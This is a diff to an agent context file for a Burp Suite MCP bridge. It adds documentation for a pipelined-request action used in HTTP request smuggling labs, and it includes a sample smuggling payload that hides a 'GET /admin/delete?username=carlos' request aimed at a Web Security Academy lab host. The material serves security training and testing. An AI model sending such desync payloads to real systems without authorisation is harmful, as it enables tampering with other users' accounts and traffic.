@@ -1,4 +1,4 @@
-# Burp MCP Bridge - Agent Context File (v2.4.2)
+# Burp MCP Bridge - Agent Context File (v2.4.3)
 
 ## 🚀 MANDATORY: Always Start With Documentation Discovery
 
@@ -160,6 +160,29 @@ await use_mcp_tool("burp-mcp-bridge", "burp_custom_http", {
 });
 ```
 
+### Request Smuggling (SEND_PIPELINED — ONE TLS socket, multiple requests)
+Required for CL.0, TE.CL, CL.TE, TE.0, 0.CL, connection-state attacks. SEND_REQUEST and SEND_PARALLEL open separate sockets and cannot trigger desync.
+```javascript
+await use_mcp_tool("burp-mcp-bridge", "burp_custom_http", {
+  "action": "SEND_PIPELINED",
+  "target_host": "LAB-ID.web-security-academy.net",
+  "target_port": 443,
+  "requests": [
+    // Request 1: vulnerable POST with smuggled GET in body
+    "POST /vulnerable HTTP/1.1\r\nHost: lab\r\nContent-Type: text/plain\r\nContent-Length: 50\r\nConnection: keep-alive\r\n\r\nGET /admin/delete?username=carlos HTTP/1.1\r\nFoo: x",
+    // Request 2: trigger that the back-end will see the smuggled body of
+    "GET / HTTP/1.1\r\nHost: lab\r\nConnection: close\r\n\r\n"
+  ],
+  // Optional knobs:
+  // "inter_request_delay_ms": 100,  // pause-based desync
+  // "expect_responses": 2,           // override if smuggling consumes one
+  // "read_timeout_ms": 5000          // also captures trailing bytes
+});
+// → responses: [{ status_code: 200, ...}, { status_code: 302, ...}]
+// → each response includes raw_bytes (base64) for byte-level inspection
+// → trailing_bytes captures stray queued responses (response-queue-poisoning)
+```
+
 ## 📚 Documentation Resources
 
 - **Tool Reference**: Always use `burp_help` tool
@@ -185,12 +208,16 @@ await use_mcp_tool("burp-mcp-bridge", "burp_help", {
 
 ## 🛠️ Project Info
 
-- **Version**: 2.4.2
+- **Version**: 2.4.3
 - **Total Tools**: 22 (1 help + 21 security)
 - **Port**: 8081 (Burp extension HTTP server)
 - **Transport**: Dual mode (stdio + HTTP/SSE)
 - **MCP Spec**: 2025-06-18 (with annotations)
 - **Status**: Production Ready
+
+## ⚠️ Known Limitations
+
+- **HTTP/2 multi-stream-on-one-connection** is not supported. `SEND_PIPELINED` is HTTP/1.1 only — it rejects via clear error if the server negotiates h2 via ALPN. This blocks H2-track smuggling labs (H2.CL, H2.TE, H2 response-queue poisoning, H2 request tunnelling) that require dispatching multiple streams on the same persistent H2 connection at different wall-clock times. Current workaround: raw Python with the `h2` library. Tracked as `TODO(h2-multiplex)` in `CustomHttpTool.java`.
 
 ## 🌐 Transport Support (v2.0.1+)
 
